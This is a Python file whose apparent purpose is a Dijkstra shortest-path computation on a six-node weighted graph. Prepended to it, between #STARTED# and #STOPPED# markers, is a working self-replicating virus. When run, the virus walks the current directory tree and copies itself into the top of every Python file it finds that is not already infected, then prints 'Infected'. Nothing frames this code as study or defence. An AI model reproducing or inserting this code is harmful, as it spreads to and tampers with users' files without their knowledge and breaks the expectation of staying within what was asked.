
#STARTED#
import sys, os
def virus(python):
    begin = "#STARTED#\n"
    end = "#STOPPED#\n"
    with open(sys.argv[0], "r") as copy:
        k = 0
        virus_code = "\n"
        for line in copy:
            if line == begin:
                k = 1
                virus_code += begin
            elif k == 1 and line != end:
                virus_code += line
            elif line == end:
                virus_code += end
                break
            else:
                pass
    with open(python, "r") as file:
        origin_code = ""
        for line in file:
            origin_code += line
            if line == begin:
                Virus = True
                break
            else:
                Virus = False
    if Virus == False:
        with open(python, "w") as paste:
            paste.write(virus_code +"\n\n" + origin_code)
    else:
        pass

def code(void):
    print("Infected")

code(None)
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            if os.path.splitext(path)[1] == ".py":
                virus(path)
            else:
                pass
        else:
            walk(path)
walk(os.getcwd())
#STOPPED#

import math

def get_link(v, matrice):
    for i, weight in enumerate(matrice[v]):
        if weight > 0:
            yield i

def arg_min(T, S):
    amin = -1
    m = max(T)
    for i, t in enumerate(T):
        if t < m and i not in S:
            m = t
            amin = i
    return amin

matrice = ((0, 3, 1, 3, 0, 0),
     (3, 0, 4, 0, 0, 0),
     (1, 4, 0, 0, 7, 5),
     (3, 0, 0, 0, 0, 2),
     (0, 0, 7, 0, 0, 4),
     (0, 0, 5, 2, 4, 0))

lenght = len(matrice)
T = [math.inf] * lenght

v = 0
S = {v}
T[v] = 0

while v != -1:
    for j in get_link(v, matrice):
        if j not in S:
            w = T[v] + matrice[v][j]
            if w < T[j]:
                T[j] = w

    v = arg_min(T, S)
    if v > 0:
        S.add(v)
print(T)
